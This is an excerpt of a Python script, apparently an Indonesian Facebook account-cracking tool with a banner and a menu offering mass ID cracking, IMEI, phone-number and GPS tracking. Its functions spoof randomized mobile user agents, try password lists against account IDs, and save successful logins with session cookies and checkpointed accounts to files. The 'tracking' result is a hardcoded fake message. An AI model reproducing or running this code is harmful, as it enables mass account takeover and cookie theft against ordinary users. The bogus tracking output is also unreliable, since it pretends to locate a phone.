...
for xd in range(10000):
	...
	c=random.choice(['220333QAG Build/',
'Redmi 11X Build/',
'en-in; Redmi 9',
'vivo Y17T Build/',
'vivo 1913 Build/',
...
'I2208 Build/'])
	...
	g=random.choice(['AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/',
'AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'])
	h=random.randrange(73,150)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l=random.choice(['Mobile Safari/537.36',
'Mobile Safari/534.30 AliApp (TB/6.2.4) WindVane/8.0.0 1080X1920 GCanvas/1.4.2.21',
'Safari Seluler/537.36 AliApp(TB/7.5.0) UCBS/2.11.1.1 WindVane/8.3.0 1080X1920',
'Mobile Safari/537.36 V1_AND_SQ_7.5.0_794_YYB_D QQ/7.5.0.3430 NetType/4G WebP/0.4.1 Piksel/1080'])
...
def banner():
 ...
 _____ ______  _____   ________  ___ _____ _____ 
|  __ \| ___ \/  ___| |_   _|  \/  ||  ___|_   _|
| |  \/| |_/ /\ `--.    | | | .  . || |__   | |  
| | __ |  __/  `--. \   | | | |\/| ||  __|  | |  
| |_\ \| |    /\__/ /  _| |_| |  | || |___ _| |_ 
 \____/\_|    \____/   \___/\_|  |_/\____/ \___/ 
...
def menu(my_name,my_id):
	...
	syg.append(panel(f'[bold white] Mod By   : [bold green]Meichaelz\n[bold white] Tols   : [bold green]LORD-MEKEL\n[bold white]Update   : [bold green]{tgl} {bln} {thn}\n[bold white]Ke Versi : [bold green]V2.5',width=70,padding=(0,1),title='[bold red]•[bold yellow]•[bold green]• [bold yellow] Script FB[bold green]•[bold yellow]•[bold red]•',style=f'{domris}'))
	wa.print(Columns(syg))
	Console(width=70, style=f"{domris}").print(panel("""[bold green]1[bold white]. Crack Masal ID
[bold green]2[bold white]. LACAK IMEI
[bold green]3[bold white]. LACAK NOHP
[bold green]4[bold white]. GPS MAP
...
def crack_file():
	...
	if len(vin)==0:
		print('')
		cetak(nel('[white][[cyan]•[white]] LOKASI BERADA DIAREA : JAKARTA INDONESIA IMEI : 356785873402347\n[[green]1[white]] MEREK HP ADALAH : INFINIX NOTE 30\n[[green]2[white]] GPS : HP TIDAK NYALA GPS !![yellow] UDIN-DUMP[white] SILAHKAN PERGI KELOKASI\n[[green]3[white]] CIDUK ORANGNYA YNG AMBIL HP MU !![yellow] 4 [white]ini '))
...
def crackmobilev2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white][KRD] {H2}[{idf}]{P2} {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print(f'\r{K}[CP] ID : {idf}:{K}{pw}')
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":{"appName" : " Netscape " ,"connection" : {"downlink" : 10 ,"effectiveType" : " 4g " ,"rtt" : 0 },"platform" : " Win32 " ,"pluginsLength" : 3 ,"vendor" : " Google Inc. " ,"userAgent" : " NokiaX2-00/5.0 (08.25) Profil/Konfigurasi MIDP-2.1/CLDC-1.1 Mozilla/5.0 (SymbianOS/9.2; U; Seri60/3.1 NokiaE71-1/100.07.57; Profil/Konfigurasi MIDP-2.0/CLDC-1.1 ) AppleWebKit/413 (KHTML, seperti Gecko) Safari/413 TIDAK TERPERCAYA/1.0 " ,"viewportHeight" : 660 ,"viewportWidth" : 1260 ,"deviceCategory" : " desktop " ,"screenHeight": 800 ,"lebar layar": 1280 }}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print(f'\r{B}[OK] ID : {idf}:{B}{pw}')
					break
...
def crackreguler(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white][Udin 😎] {H2}[{idf}]{P2} {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
...
def crackvalidate(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white][m.fb 👻] {H2}[{idf}]{P2} {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
